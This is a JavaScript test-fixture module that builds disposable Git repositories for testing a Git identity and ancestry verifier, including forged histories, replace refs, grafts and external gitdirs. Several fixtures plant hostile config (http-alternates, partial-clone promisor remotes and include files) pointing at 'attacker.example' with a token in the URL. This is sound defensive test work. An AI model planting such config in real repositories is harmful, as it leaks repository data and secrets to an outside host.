// Disposable repository fixtures for W13-P14 Git identity and ancestry
// verification. Construction uses argv git only; the product verifier is
// never imported here so forged histories stay parent-failing until the
// verifier module exists.

import { spawn } from 'node:child_process';
import { mkdir, mkdtemp, rename, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

export const RUN_ID = 'run-git-identity-01';
export const ASSIGNMENT_ID = 'lane-verify';
export const BASE_REF = 'refs/heads/main';

const GIT = '/usr/bin/git';
const FIXTURE_ENV = Object.freeze({
  PATH: '/usr/bin:/bin',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_SYSTEM: '/dev/null',
  GIT_AUTHOR_NAME: 'P14 Fixture',
  GIT_AUTHOR_EMAIL: 'p14@example.test',
  GIT_COMMITTER_NAME: 'P14 Fixture',
  GIT_COMMITTER_EMAIL: 'p14@example.test',
  GIT_AUTHOR_DATE: '2020-01-01T00:00:00Z',
  GIT_COMMITTER_DATE: '2020-01-01T00:00:00Z',
});

export function countingProxy(target) {
  const counts = { get: 0, ownKeys: 0, getOwnPropertyDescriptor: 0, has: 0, apply: 0 };
  const proxy = new Proxy(target, {
    get(inner, property, receiver) {
      counts.get += 1;
      return Reflect.get(inner, property, receiver);
    },
    ownKeys(inner) {
      counts.ownKeys += 1;
      return Reflect.ownKeys(inner);
    },
    getOwnPropertyDescriptor(inner, property) {
      counts.getOwnPropertyDescriptor += 1;
      return Reflect.getOwnPropertyDescriptor(inner, property);
    },
    has(inner, property) {
      counts.has += 1;
      return Reflect.has(inner, property);
    },
    apply() {
      counts.apply += 1;
      throw new Error('proxy apply must never run');
    },
  });
  return { proxy, counts };
}

export function trapTotal(counts) {
  return counts.get + counts.ownKeys + counts.getOwnPropertyDescriptor + counts.has + counts.apply;
}

export function validRequest(overrides = {}) {
  const repository = overrides.repository ?? {
    path: overrides.path,
    base_sha: overrides.base_sha,
  };
  const request = {
    repository,
    expected_base_ref: overrides.expected_base_ref ?? BASE_REF,
    candidate_head_sha: overrides.candidate_head_sha ?? overrides.head_sha,
    run_id: overrides.run_id ?? RUN_ID,
    assignment_id: overrides.assignment_id ?? ASSIGNMENT_ID,
    sequence: overrides.sequence ?? 0,
  };
  for (const key of Object.keys(overrides)) {
    if (key === 'path' || key === 'base_sha' || key === 'head_sha') continue;
    request[key] = overrides[key];
  }
  return request;
}

function runFixtureGit(cwd, args, env = FIXTURE_ENV) {
  return new Promise((resolve, reject) => {
    const child = spawn(GIT, args, {
      cwd,
      env,
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    const stdoutChunks = [];
    const stderrChunks = [];
    child.stdout.on('data', (chunk) => stdoutChunks.push(chunk));
    child.stderr.on('data', (chunk) => stderrChunks.push(chunk));
    child.on('error', reject);
    child.on('close', (code) => {
      const stdout = Buffer.concat(stdoutChunks).toString('utf8').trim();
      const stderr = Buffer.concat(stderrChunks).toString('utf8').trim();
      if (code !== 0) {
        const error = new Error(`fixture git failed: ${args.join(' ')}`);
        error.stdout = stdout;
        error.stderr = stderr;
        error.code = code;
        reject(error);
        return;
      }
      resolve(stdout);
    });
  });
}

async function emptyRepo(prefix) {
  const root = await mkdtemp(path.join(tmpdir(), prefix));
  await runFixtureGit(root, ['-c', 'init.defaultBranch=main', 'init', '--initial-branch=main']);
  return root;
}

async function commit(root, message, fileName = 'file.txt', contents = message) {
  await writeFile(path.join(root, fileName), `${root}\n${contents}\n`, 'utf8');
  await runFixtureGit(root, ['add', '--', fileName]);
  await runFixtureGit(root, ['commit', '-m', `${message} ${root}`]);
  return runFixtureGit(root, ['rev-parse', 'HEAD']);
}

export async function cleanupRepo(root) {
  await rm(root, { recursive: true, force: true });
}

function wrap(root, fields) {
  return {
    path: root,
    ...fields,
    cleanup: () => cleanupRepo(root),
  };
}

export async function createLinearRepo() {
  const root = await emptyRepo('p14-linear-');
  const baseSha = await commit(root, 'base', 'base.txt', 'base');
  await runFixtureGit(root, ['branch', '--', 'candidate']);
  await runFixtureGit(root, ['checkout', 'candidate']);
  const headSha = await commit(root, 'head', 'head.txt', 'head');
  await runFixtureGit(root, ['checkout', 'main']);
  return wrap(root, { baseSha, headSha, extra: { commits: [baseSha, headSha] } });
}

export async function createStaleBaseRepo() {
  const root = await emptyRepo('p14-stale-');
  const expectedBaseSha = await commit(root, 'expected-base', 'a.txt', 'a');
  const currentBaseSha = await commit(root, 'moved-base', 'b.txt', 'b');
  return wrap(root, {
    baseSha: expectedBaseSha,
    headSha: currentBaseSha,
    extra: { currentBaseSha },
  });
}

export async function createRewrittenHistoryRepo() {
  const root = await emptyRepo('p14-rewrite-');
  const expectedBaseSha = await commit(root, 'original-base', 'orig.txt', 'orig');
  await runFixtureGit(root, ['branch', '--', 'keep-original']);
  await runFixtureGit(root, ['checkout', '--orphan', 'rewritten']);
  await runFixtureGit(root, ['rm', '-rf', '--', '.']);
  const rewrittenSha = await commit(root, 'rewritten-root', 'new.txt', 'new');
  await runFixtureGit(root, ['checkout', '-B', 'main', rewrittenSha]);
  return wrap(root, {
    baseSha: expectedBaseSha,
    headSha: rewrittenSha,
    extra: { rewrittenSha },
  });
}

export async function createUnreachableHeadRepo() {
  const root = await emptyRepo('p14-unreach-');
  const baseSha = await commit(root, 'base', 'base.txt', 'base');
  await runFixtureGit(root, ['checkout', '--orphan', 'side']);
  const sideSha = await commit(root, 'side', 'side.txt', 'side');
  await runFixtureGit(root, ['checkout', 'main']);
  return wrap(root, {
    baseSha,
    headSha: sideSha,
    extra: { sideSha },
  });
}

export async function createWrongMergeBaseRepo() {
  const root = await emptyRepo('p14-mergebase-');
  const rootSha = await commit(root, 'root', 'root.txt', 'root');
  await runFixtureGit(root, ['checkout', '-b', 'left']);
  const leftSha = await commit(root, 'left', 'left.txt', 'left');
  await runFixtureGit(root, ['checkout', '-B', 'main', leftSha]);
  await runFixtureGit(root, ['checkout', '-b', 'right', rootSha]);
  const rightSha = await commit(root, 'right', 'right.txt', 'right');
  await runFixtureGit(root, ['checkout', 'main']);
  return wrap(root, {
    baseSha: leftSha,
    headSha: rightSha,
    extra: { rootSha, leftSha, rightSha },
  });
}

export async function createReplaceRefRepo() {
  const repo = await createLinearRepo();
  const tree = await runFixtureGit(repo.path, ['rev-parse', 'HEAD^{tree}']);
  const forged = await runFixtureGit(repo.path, [
    'commit-tree', tree, '-m', 'forged-replace',
  ]);
  await runFixtureGit(repo.path, ['replace', repo.baseSha, forged]);
  repo.extra = { ...repo.extra, forged };
  return repo;
}

export async function createGraftsRepo() {
  const repo = await createLinearRepo();
  const graftsDir = path.join(repo.path, '.git', 'info');
  await mkdir(graftsDir, { recursive: true });
  await writeFile(
    path.join(graftsDir, 'grafts'),
    `${repo.headSha} ${'0'.repeat(40)}\n`,
    'utf8',
  );
  return repo;
}

export async function createDetachedHeadRepo() {
  const repo = await createLinearRepo();
  await runFixtureGit(repo.path, ['checkout', '--detach', repo.headSha]);
  return repo;
}

export async function createUnbornRepo() {
  const root = await emptyRepo('p14-unborn-');
  return wrap(root, {
    baseSha: 'a'.repeat(40),
    headSha: 'b'.repeat(40),
    extra: {},
  });
}

export async function createNonCommitHeadRepo() {
  const repo = await createLinearRepo();
  const treeSha = await runFixtureGit(repo.path, ['rev-parse', 'HEAD^{tree}']);
  repo.extra = { ...repo.extra, treeSha };
  repo.headSha = treeSha;
  return repo;
}

export async function createSymbolicRefDriftRepo() {
  const repo = await createLinearRepo();
  await runFixtureGit(repo.path, ['symbolic-ref', 'refs/heads/alias', BASE_REF]);
  repo.extra = { ...repo.extra, alias: 'refs/heads/alias' };
  return repo;
}

export async function createMissingRepoPath() {
  const root = await mkdtemp(path.join(tmpdir(), 'p14-missing-'));
  await rm(root, { recursive: true, force: true });
  return wrap(root, {
    baseSha: 'a'.repeat(40),
    headSha: 'b'.repeat(40),
    extra: {},
  });
}

export async function createNonGitDirectory() {
  const root = await mkdtemp(path.join(tmpdir(), 'p14-nongit-'));
  await writeFile(path.join(root, 'readme.txt'), 'not a git repo\n', 'utf8');
  return wrap(root, {
    baseSha: 'a'.repeat(40),
    headSha: 'b'.repeat(40),
    extra: {},
  });
}

export async function createLinkedWorktreeRepo() {
  const main = await createLinearRepo();
  const linkedParent = await mkdtemp(path.join(tmpdir(), 'p14-linked-'));
  const linkedRoot = path.join(linkedParent, 'wt');
  await runFixtureGit(main.path, ['worktree', 'add', '-b', 'linked-head', linkedRoot, main.headSha]);
  return {
    path: linkedRoot,
    baseSha: main.baseSha,
    headSha: main.headSha,
    extra: { mainPath: main.path },
    cleanup: async () => {
      try {
        await runFixtureGit(main.path, ['worktree', 'remove', '--force', linkedRoot]);
      } catch {
        await cleanupRepo(linkedRoot);
      }
      await cleanupRepo(linkedParent);
      await main.cleanup();
    },
  };
}

export async function createExternalGitdirRepo() {
  const repo = await createLinearRepo();
  const externalRoot = await mkdtemp(path.join(tmpdir(), 'p14-extgit-'));
  const externalGit = path.join(externalRoot, 'hostile.git');
  await rename(path.join(repo.path, '.git'), externalGit);
  await writeFile(path.join(repo.path, '.git'), `gitdir: ${externalGit}\n`, 'utf8');
  const originalCleanup = repo.cleanup;
  repo.extra = { ...repo.extra, externalGit };
  repo.cleanup = async () => {
    await originalCleanup();
    await cleanupRepo(externalRoot);
  };
  return repo;
}

export async function createSymlinkGitdirRepo() {
  const repo = await createLinearRepo();
  const externalRoot = await mkdtemp(path.join(tmpdir(), 'p14-symgit-'));
  const externalGit = path.join(externalRoot, 'hostile.git');
  await rename(path.join(repo.path, '.git'), externalGit);
  await symlink(externalGit, path.join(repo.path, '.git'));
  const originalCleanup = repo.cleanup;
  repo.extra = { ...repo.extra, externalGit };
  repo.cleanup = async () => {
    await originalCleanup();
    await cleanupRepo(externalRoot);
  };
  return repo;
}

export async function createAlternatesRepo() {
  const donor = await createLinearRepo();
  const repo = await createLinearRepo();
  const infoDir = path.join(repo.path, '.git', 'objects', 'info');
  await mkdir(infoDir, { recursive: true });
  await writeFile(
    path.join(infoDir, 'alternates'),
    `${path.join(donor.path, '.git', 'objects')}\n`,
    'utf8',
  );
  const originalCleanup = repo.cleanup;
  repo.extra = { ...repo.extra, donorPath: donor.path, donorHeadSha: donor.headSha };
  repo.cleanup = async () => {
    await originalCleanup();
    await donor.cleanup();
  };
  return repo;
}

export async function createHttpAlternatesRepo() {
  const repo = await createLinearRepo();
  const infoDir = path.join(repo.path, '.git', 'objects', 'info');
  await mkdir(infoDir, { recursive: true });
  await writeFile(
    path.join(infoDir, 'http-alternates'),
    'https://attacker.example/objects?token=SUPERSECRET\n',
    'utf8',
  );
  return repo;
}

export async function createPromisorPackRepo() {
  const repo = await createLinearRepo();
  const packDir = path.join(repo.path, '.git', 'objects', 'pack');
  await mkdir(packDir, { recursive: true });
  await writeFile(path.join(packDir, 'pack-deadbeef.promisor'), '', 'utf8');
  return repo;
}

export async function createPartialCloneConfigRepo() {
  const repo = await createLinearRepo();
  await runFixtureGit(repo.path, ['config', 'extensions.partialClone', 'origin']);
  await runFixtureGit(repo.path, ['config', 'remote.origin.promisor', 'true']);
  await runFixtureGit(repo.path, ['config', 'remote.origin.partialclonefilter', 'blob:none']);
  await runFixtureGit(repo.path, ['config', 'remote.origin.url', 'https://attacker.example/steal.git']);
  return repo;
}

const HOSTILE_INCLUDE_BYTES = `[extensions]
	partialClone = origin
[remote "origin"]
	url = https://attacker.example/steal.git?token=SUPERSECRET
	promisor = true
	partialclonefilter = blob:none
`;

function attachCleanup(repo, extraRoots) {
  const originalCleanup = repo.cleanup;
  repo.cleanup = async () => {
    await originalCleanup();
    for (const root of extraRoots) await cleanupRepo(root);
  };
  return repo;
}

async function writeHostileIncludeFile(prefix) {
  const externalRoot = await mkdtemp(path.join(tmpdir(), prefix));
  const includeFile = path.join(externalRoot, 'hostile.cfg');
  await writeFile(includeFile, HOSTILE_INCLUDE_BYTES, 'utf8');
  return { externalRoot, includeFile };
}

export async function createAbsoluteExternalIncludeRepo() {
  const repo = await createLinearRepo();
  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-absinc-');
  await runFixtureGit(repo.path, ['config', 'include.path', includeFile]);
  repo.extra = { ...repo.extra, includeFile, token: 'SUPERSECRET' };
  return attachCleanup(repo, [externalRoot]);
}

export async function createRelativeExternalIncludeRepo() {
  const repo = await createLinearRepo();
  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-relinc-');
  const relative = path.relative(path.join(repo.path, '.git'), includeFile);
  await runFixtureGit(repo.path, ['config', 'include.path', relative]);
  repo.extra = { ...repo.extra, includeFile, relative, token: 'SUPERSECRET' };
  return attachCleanup(repo, [externalRoot]);
}

export async function createActiveIncludeIfRepo() {
  const repo = await createLinearRepo();
  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-incif-');
  await runFixtureGit(repo.path, ['config', 'includeIf.onbranch:main.path', includeFile]);
  repo.extra = { ...repo.extra, includeFile, token: 'SUPERSECRET' };
  return attachCleanup(repo, [externalRoot]);
}

export async function createSymlinkExternalIncludeRepo() {
  const repo = await createLinearRepo();
  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-syminc-');
  const linkPath = path.join(repo.path, '.git', 'included.cfg');
  await symlink(includeFile, linkPath);
  await runFixtureGit(repo.path, ['config', 'include.path', 'included.cfg']);
  repo.extra = { ...repo.extra, includeFile, linkPath, token: 'SUPERSECRET' };
  return attachCleanup(repo, [externalRoot]);
}

export async function createBenignIncludeRepo() {
  const repo = await createLinearRepo();
  const externalRoot = await mkdtemp(path.join(tmpdir(), 'p14-benigninc-'));
  const includeFile = path.join(externalRoot, 'benign.cfg');
  await writeFile(includeFile, '[user]\n\tname = p14-benign\n', 'utf8');
  await runFixtureGit(repo.path, ['config', 'include.path', includeFile]);
  repo.extra = { ...repo.extra, includeFile };
  return attachCleanup(repo, [externalRoot]);
}

export async function createLinkedWorktreePromisorConfigRepo() {
  const linked = await createLinkedWorktreeRepo();
  await runFixtureGit(linked.extra.mainPath, ['config', 'extensions.worktreeConfig', 'true']);
  await runFixtureGit(linked.path, ['config', '--worktree', 'remote.origin.promisor', 'true']);
  await runFixtureGit(linked.path, [
    'config', '--worktree', 'remote.origin.partialclonefilter', 'blob:none',
  ]);
  await runFixtureGit(linked.path, [
    'config', '--worktree', 'remote.origin.url',
    'https://attacker.example/worktree.git?token=WTSECRET',
  ]);
  linked.extra = { ...linked.extra, token: 'WTSECRET' };
  return linked;
}

export async function createLinkedWorktreeBenignConfigRepo() {
  const linked = await createLinkedWorktreeRepo();
  await runFixtureGit(linked.extra.mainPath, ['config', 'extensions.worktreeConfig', 'true']);
  await runFixtureGit(linked.path, ['config', '--worktree', 'user.name', 'p14-linked-benign']);
  return linked;
}

export async function createAnnotatedTagBranchRepo() {
  const repo = await createLinearRepo();
  await runFixtureGit(repo.path, ['tag', '-a', 'forged-base', '-m', 'forged annotated base', repo.baseSha]);
  const tagSha = await runFixtureGit(repo.path, ['rev-parse', 'forged-base']);
  await writeFile(path.join(repo.path, '.git', 'refs', 'heads', 'main'), `${tagSha}\n`, 'utf8');
  repo.extra = { ...repo.extra, tagSha };
  return repo;
}
